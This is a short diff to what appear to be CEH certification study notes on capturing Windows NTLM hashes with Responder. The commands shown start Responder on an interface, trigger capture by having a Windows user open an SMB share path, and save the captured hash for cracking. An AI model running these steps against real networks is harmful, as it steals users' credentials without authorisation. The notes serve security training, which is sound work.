@@ -14,6 +14,12 @@ sudo responder -I eth0
 > -I = specifies the interface
 > > here eth0 
 
+-> someone has to access the smb service or shared drive in window to capture NTLM hash 
+- In windows
+```powershell
+ \\IP\CEH-Tools
+```
+ 
 > by default, responder stores the logs in /usr/share/responder/logs
 
 → copy the hash of the user and save it in a .txt file
